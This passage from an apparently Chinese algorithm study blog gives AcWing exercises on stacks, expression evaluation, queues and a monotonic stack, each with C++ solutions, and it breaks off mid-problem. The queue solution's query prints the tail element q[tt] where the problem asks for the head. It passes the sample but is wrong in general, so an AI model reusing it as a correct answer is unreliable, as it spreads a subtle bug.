class="built_in">a</span></span><br><span class="line">(<span class="type">int</span> [<span class="number">10</span>]) &#123; <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;  <span class="comment">// 先赋值再++, 否则为3 (前面++过所以为2)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="栈">栈</h1><h2 id="AcWing-828-模拟栈"><a href="https://www.acwing.com/problem/content/830/">AcWing 828. 模拟栈</a></h2><p>实现一个栈，栈初始为空，支持四种操作：</p><ol><li><code>push x</code> – 向栈顶插入一个数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>；</li><li><code>pop</code> – 从栈顶弹出一个数；</li><li><code>empty</code> – 判断栈是否为空；</li><li><code>query</code> – 查询栈顶元素。</li></ol><p>现在要对栈进行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 个操作，其中的每个操作 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> 和操作 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span> 都要输出相应的结果。</p><h4 id="输入格式">输入格式</h4><p>第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>，表示操作次数。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 行，每行包含一个操作命令，操作命令为 <code>push x</code>，<code>pop</code>，<code>empty</code>，<code>query</code> 中的一种。</p><h4 id="输出格式">输出格式</h4><p>对于每个 <code>empty</code> 和 <code>query</code> 操作都要输出一个查询结果，每个结果占一行。</p><p>其中，<code>empty</code> 操作的查询结果为 <code>YES</code> 或 <code>NO</code>，<code>query</code> 操作的查询结果为一个整数，表示栈顶元素的值。</p><h4 id="数据范围">数据范围</h4><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>M</mi><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le M \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>x</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \le x \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span><br>所有操作保证合法。</p><h4 id="输入样例：">输入样例：</h4><pre><code>10push 5querypush 6popquerypopemptypush 4queryempty</code></pre><h4 id="输出样例：">输出样例：</h4><pre><code>55YES4NO</code></pre><h3 id="数组模拟栈">数组模拟栈</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> stk[kN], tt;  <span class="comment">// tt=0表示栈为空, 第一个工作节点的下标从1开始</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  </span><br><span class="line">  string op;</span><br><span class="line">  <span class="type">int</span> x;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    cin &gt;&gt; op;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="string">&quot;push&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">      stk[++tt] = x;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;pop&quot;</span>) &#123;</span><br><span class="line">      tt--;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;query&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, stk[tt]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;empty&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, (tt?  <span class="string">&quot;NO&quot;</span>: <span class="string">&quot;YES&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-3302-表达式求值★"><a href="https://www.acwing.com/problem/content/3305/">AcWing 3302. 表达式求值★</a></h2><p>给定一个表达式，其中运算符仅包含 <code>+,-,*,/</code>（加 减 乘 整除），可能包含括号，请你求出表达式的最终值。</p><p><strong>注意：</strong></p><ul><li>数据保证给定的表达式合法。</li><li>题目保证符号 <code>-</code> 只作为减号出现，不会作为负号出现，例如，<code>-1+2</code>,<code>(2+2)*(-(1+1)+2)</code> 之类表达式均不会出现。</li><li>题目保证表达式中所有数字均为正整数。</li><li>题目保证表达式在中间计算过程以及结果中，均不超过 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。</li><li>题目中的整除是指向 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 取整，也就是说对于大于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 的结果向下取整，例如 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn><mi mathvariant="normal">/</mi><mn>3</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">5/3=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">5/3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，对于小于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 的结果向上取整，例如 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mn>4</mn><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">5/(1-4) = -1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">5/</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">1</span></span></span></span>。</li><li>C++和Java中的整除默认是向零取整；Python中的整除<code>//</code>默认向下取整，因此Python的<code>eval()</code>函数中的整除也是向下取整，在本题中不能直接使用。</li></ul><h4 id="输入格式-2">输入格式</h4><p>共一行，为给定表达式。</p><h4 id="输出格式-2">输出格式</h4><p>共一行，为表达式的结果。</p><h4 id="数据范围-2">数据范围</h4><p>表达式的长度不超过 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span>。</p><h4 id="输入样例：-2">输入样例：</h4><pre><code>(2+2)*(1+1)</code></pre><h4 id="输出样例：-2">输出样例：</h4><pre><code>8</code></pre><h3 id="基于栈">基于栈</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">stack&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">stack&lt;<span class="type">char</span>&gt; op;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eval</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> b = nums.<span class="built_in">top</span>(); nums.<span class="built_in">pop</span>();</span><br><span class="line">  <span class="type">int</span> a = nums.<span class="built_in">top</span>(); nums.<span class="built_in">pop</span>();</span><br><span class="line">  <span class="type">char</span> c = op.<span class="built_in">top</span>(); op.<span class="built_in">pop</span>();</span><br><span class="line">  <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: nums.<span class="built_in">push</span>(a + b); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: nums.<span class="built_in">push</span>(a - b); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: nums.<span class="built_in">push</span>(a * b); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>: nums.<span class="built_in">push</span>(a / b); <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; pr&#123;&#123;<span class="string">&#x27;+&#x27;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&#x27;-&#x27;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&#x27;*&#x27;</span>, <span class="number">2</span>&#125;, &#123;<span class="string">&#x27;/&#x27;</span>, <span class="number">2</span>&#125;&#125;;</span><br><span class="line">  string str;</span><br><span class="line">  cin &gt;&gt; str;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; str.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="type">char</span> c = str[i];</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isdigit</span>(c)) &#123;</span><br><span class="line">      <span class="type">int</span> j = i, x = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> (j &lt; str.<span class="built_in">size</span>() &amp;&amp; <span class="built_in">isdigit</span>(str[j])) x = <span class="number">10</span> * x + str[j++] - <span class="string">&#x27;0&#x27;</span>;  <span class="comment">// j++啦, 否则报TLE</span></span><br><span class="line">      nums.<span class="built_in">push</span>(x);</span><br><span class="line">      i = j - <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">      op.<span class="built_in">push</span>(c);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span> (op.<span class="built_in">size</span>() &amp;&amp; op.<span class="built_in">top</span>() != <span class="string">&#x27;(&#x27;</span>) <span class="built_in">eval</span>();</span><br><span class="line">      op.<span class="built_in">pop</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">while</span> (op.<span class="built_in">size</span>() &amp;&amp; op.<span class="built_in">top</span>() != <span class="string">&#x27;(&#x27;</span> &amp;&amp; pr[op.<span class="built_in">top</span>()] &gt;= pr[c]) <span class="built_in">eval</span>();</span><br><span class="line">      op.<span class="built_in">push</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (op.<span class="built_in">size</span>()) <span class="built_in">eval</span>();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, nums.<span class="built_in">top</span>());</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="队列">队列</h1><h2 id="AcWing-829-模拟队列"><a href="https://www.acwing.com/problem/content/831/">AcWing 829. 模拟队列</a></h2><p>实现一个队列，队列初始为空，支持四种操作：</p><ol><li><code>push x</code> – 向队尾插入一个数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>；</li><li><code>pop</code> – 从队头弹出一个数；</li><li><code>empty</code> – 判断队列是否为空；</li><li><code>query</code> – 查询队头元素。</li></ol><p>现在要对队列进行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 个操作，其中的每个操作 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> 和操作 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span> 都要输出相应的结果。</p><h4 id="输入格式-3">输入格式</h4><p>第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>，表示操作次数。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 行，每行包含一个操作命令，操作命令为 <code>push x</code>，<code>pop</code>，<code>empty</code>，<code>query</code> 中的一种。</p><h4 id="输出格式-3">输出格式</h4><p>对于每个 <code>empty</code> 和 <code>query</code> 操作都要输出一个查询结果，每个结果占一行。</p><p>其中，<code>empty</code> 操作的查询结果为 <code>YES</code> 或 <code>NO</code>，<code>query</code> 操作的查询结果为一个整数，表示队头元素的值。</p><h4 id="数据范围-3">数据范围</h4><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>M</mi><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le M \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>x</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \le x \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span>,<br>所有操作保证合法。</p><h4 id="输入样例：-3">输入样例：</h4><pre><code>10push 6emptyquerypopemptypush 3push 4popquerypush 6</code></pre><h4 id="输出样例：-3">输出样例：</h4><pre><code>NO6YES4</code></pre><h3 id="数组模拟队列">数组模拟队列</h3><blockquote><p>模拟队列, 初始化: hh = 0, tt = -1,  入队列: q[++tt] = x,  查空: hh &lt;= tt</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> q[kN], hh = <span class="number">0</span>, tt = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  </span><br><span class="line">  string op;</span><br><span class="line">  <span class="type">int</span> x;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    cin &gt;&gt; op;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="string">&quot;push&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">      q[++tt] = x;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;pop&quot;</span>) &#123;</span><br><span class="line">      hh++;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;query&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, q[tt]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;empty&quot;</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, (hh &lt;= tt? <span class="string">&quot;NO&quot;</span>: <span class="string">&quot;YES&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="单调栈">单调栈</h1><h2 id="AcWing-830-单调栈"><a href="https://www.acwing.com/problem/content/832/">AcWing 830. 单调栈</a></h2><p>给定一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 的整数数列，输出每个数左边第一个比它小的数，如果不存在则输出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">1</span></span></span></span>。</p><h4 id="输入格式-4">输入格式</h4><p>第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>，表示数列长度。</p><p>第二行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 个整数，表示整数数列。</p><h4 id="输出格式-4">输出格式</h4><p>共一行，包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span 